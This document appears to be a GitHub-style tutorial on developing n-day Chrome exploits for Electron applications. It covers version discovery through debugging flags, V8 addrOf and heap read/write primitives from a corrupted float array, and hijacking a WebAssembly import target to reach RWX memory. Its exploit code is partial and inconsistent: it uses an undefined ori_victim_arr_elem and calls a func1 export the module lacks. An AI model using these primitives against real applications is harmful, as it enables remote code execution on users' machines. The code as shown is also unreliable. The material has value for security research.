<header>

# How to develop n-day chrome exploit for electron applications

Electron applications usually run an older version of chrome, this exposes them to attac from public n-day chrome exploits.

</header>


## Finding chrome and v8 version 

This can be found by running the application with the argument –inspect={port} and –remote-debugging-port={port2}
The first attaches node main process to a debugger, then by loading process module the information of v8 and other properties is obtained

![image](https://github.com/user-attachments/assets/4bf57ddd-9470-4da1-900a-b80ac7306ef3)
Some applications disable the main process debug, in that case the second argument allows to debug a renderer process and find chrome version in the navigator object
 
![image](https://github.com/user-attachments/assets/5446298e-6e33-4744-819b-c42ef97b3a6f)

Once the chrome version is obtained it just a matter of finding a memory corruption for that version.

## Developing arbitrary read/write primitives
Once the initial memory corruption bug is found the process is standard, develop arbitrary read/write primitives.
One way is to have a float array with an object and a float array placed next to it. Corrupt the length of the first float array in order to modify the elements pointer of the object and the second float array, this allows to have both arrays point at the same memory address, allowing to read and write inside v8 heap.

Float arrays store data in  a literal way in memory, accessing element n of the array returns the literal value in memory of fl_arr[n]
![image](https://github.com/user-attachments/assets/3872852c-c685-4e2d-a854-f854dbfd5079)

On the other hand an object array contains an address to the object of reference 
![image](https://github.com/user-attachments/assets/4c740c74-94e8-4f3a-bcd3-a0e8028b9f50)

console.log(obj_arr[0]) returns the content of the address at obj_arr[0]
console.log(fl_arr[0]) returns the literal value in the memory of fl_arr[0]

This means that we can use the initial memory corruption to modity the elements pointer of fl_arr and obj_arr. 

We got the first primitive addrOf

If both arrays point at the same address, we can store an object in obj_arr[0], in memory obj_arr[0] will contain the address of the object. Then we can get it’s address by reading fl_arr[0], because fl_arr[0] is pointing at obj_arr[0], accesing fl_arr[0] returns the literal value in memory of obj_arr[0]

![image](https://github.com/user-attachments/assets/9457df1b-6887-461e-a3d8-d436176d5068)

```javascript
data = ftoi(oob_arr[5]);
ori_fl_arr_elem = data & 0xffffffffn; 

function addrOf(o) {
    oob_arr[5] = itof((0x8n << 32n) | ori_victim_arr_elem);

    oob_arr[26] = itof((0x8n << 32n) | ori_victim_arr_elem);
    obj_arr[0] = o;

    return ftoi(fl_arr[0]) & 0xffffffffn;
}
```
Using the same method we can read  and write memory by assigning the address to fl_arr[0]

```javascript
function heap_read(addr) {

    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
    res = ftoi(fl_arr[0]);
    return res;

}
function heap_write(addr, val) {

    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
    fl_arr[0] = itof(val);
}
```

## Code execution in renderer process
First, we obtain a way to hijack the execution target of a function, this allows us to redirect code execution to an arbitrary address. This can be obtained by getting the Imported_function_target address of a WebAssembly module.
![image](https://github.com/user-attachments/assets/447944c9-4d32-4d47-9b5d-3d7908867bb3)

Inspect the memory address of the WebAssembly module, imported_function_target  is located at offset 0x30 (this differs depending on v8 version)

![image](https://github.com/user-attachments/assets/50058b01-f94a-457e-8afa-36b5da6b2bff)

imported_function_target  address contains the address of the RWX page
![image](https://github.com/user-attachments/assets/83599be4-505b-4ffc-81f9-682613d7655d)
Confirm RX permissions
![image](https://github.com/user-attachments/assets/01349ad2-0c8d-43eb-8ff3-fb08a7f3ad33)


Define a WASM with imported function, obtain imported_function_target  and replace it with arbitrary value
```javascript

const importObject = {
 imports: {imported_func : Math.sin},
};

var code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x1b, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x6a, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x33, 0x00, 0x00, 0x02, 0x6a, 0x73, 0x03, 0x74, 0x62, 0x6c, 0x01, 0x70, 0x00, 0x02, 0x03, 0x05, 0x04, 0x01, 0x01, 0x00, 0x00, 0x07, 0x10, 0x02, 0x06, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x32, 0x00, 0x03, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x04, 0x09, 0x08, 0x01, 0x00, 0x41, 0x00, 0x0b, 0x02, 0x01, 0x02, 0x0a, 0x18, 0x04, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x05, 0x00, 0x41, 0xd3, 0x00, 0x0b, 0x04, 0x00, 0x41, 0x10, 0x0b, 0x06, 0x00, 0x41, 0x10, 0x10, 0x00, 0x0b]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);
var shellcode = instance.exports.func1;
```
